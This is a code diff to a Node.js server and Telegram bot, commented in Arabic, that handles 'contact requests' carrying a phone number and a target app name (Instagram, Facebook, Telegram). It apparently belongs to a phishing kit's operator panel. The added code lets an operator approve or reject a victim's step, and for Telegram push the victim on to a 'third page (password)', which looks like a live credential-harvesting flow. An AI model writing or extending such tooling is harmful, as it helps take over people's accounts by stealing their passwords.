@@ -366,7 +366,7 @@ app.get(
 
 
 // ============================================================
-// طلب تواصل - مع زرين فقط ✅
+// طلب تواصل - حسب التطبيق
 // ============================================================
 
 app.post(
@@ -377,7 +377,8 @@ app.post(
 
             const {
                 ref,
-                phone
+                phone,
+                app // ← اسم التطبيق (instagram, facebook, telegram)
             } = req.body;
 
 
@@ -459,7 +460,74 @@ app.post(
             );
 
 
-            // ✅ إرسال رسالة مع زرين فقط (قبول / رفض)
+            // =================================================
+            // تحديد الأزرار حسب التطبيق
+            // =================================================
+
+            let buttons = [];
+
+            // ✅ Instagram و Facebook → زرين فقط
+            if (app === "instagram" || app === "facebook") {
+
+                buttons = [
+                    [
+                        {
+                            text: "✅ قبول",
+                            callback_data: `approve:${requestId}`
+                        },
+                        {
+                            text: "❌ رفض",
+                            callback_data: `reject:${requestId}`
+                        }
+                    ]
+                ];
+
+            }
+            // ✅ Telegram → 3 أزرار
+            else if (app === "telegram") {
+
+                buttons = [
+                    [
+                        {
+                            text: "✅ قبول",
+                            callback_data: `approve:${requestId}`
+                        }
+                    ],
+                    [
+                        {
+                            text: "❌ رفض",
+                            callback_data: `reject:${requestId}`
+                        }
+                    ],
+                    [
+                        {
+                            text: "🔑 الانتقال للصفحة الثالثة",
+                            callback_data: `third_page:${requestId}`
+                        }
+                    ]
+                ];
+
+            }
+            // ✅ افتراضي → زرين
+            else {
+
+                buttons = [
+                    [
+                        {
+                            text: "✅ قبول",
+                            callback_data: `approve:${requestId}`
+                        },
+                        {
+                            text: "❌ رفض",
+                            callback_data: `reject:${requestId}`
+                        }
+                    ]
+                ];
+
+            }
+
+
+            // ✅ إرسال الرسالة
             await bot.sendMessage(
 
                 telegramId,
@@ -472,31 +540,14 @@ ${phone}
 🆔 رقم الطلب:
 ${requestId}
 
+📌 التطبيق: ${app || "غير محدد"}
+
 اختر الإجراء:`,
 
                 {
                     reply_markup: {
-
-                        inline_keyboard: [
-
-                            [
-                                {
-                                    text: "✅ قبول",
-                                    callback_data:
-                                        `approve:${requestId}`
-                                },
-
-                                {
-                                    text: "❌ رفض",
-                                    callback_data:
-                                        `reject:${requestId}`
-                                }
-                            ]
-
-                        ]
-
+                        inline_keyboard: buttons
                     }
-
                 }
 
             );
@@ -798,7 +849,7 @@ ${username}
 
 
 // ============================================================
-// أزرار البوت - زرين فقط (قبول / رفض) ✅
+// أزرار البوت
 // ============================================================
 
 bot.on(
@@ -894,6 +945,53 @@ bot.on(
                 await bot.editMessageText(
 
                     `❌ تم رفض طلب التواصل`,
+
+                    {
+                        chat_id: chatId,
+                        message_id:
+                            query.message.message_id
+                    }
+
+                );
+
+
+                return;
+            }
+
+
+            // =================================================
+            // 🔑 الانتقال للصفحة الثالثة (خاص بـ Telegram)
+            // =================================================
+
+            if (
+                data.startsWith("third_page:")
+            ) {
+
+                const requestId =
+                    data.split(":")[1];
+
+
+                await updateRequestStatus(
+                    requestId,
+                    "third_page"
+                );
+
+
+                await bot.answerCallbackQuery(
+
+                    query.id,
+
+                    {
+                        text:
+                            "🔑 تم الانتقال للصفحة الثالثة"
+                    }
+
+                );
+
+
+                await bot.editMessageText(
+
+                    `🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,
 
                     {
                         chat_id: chatId,
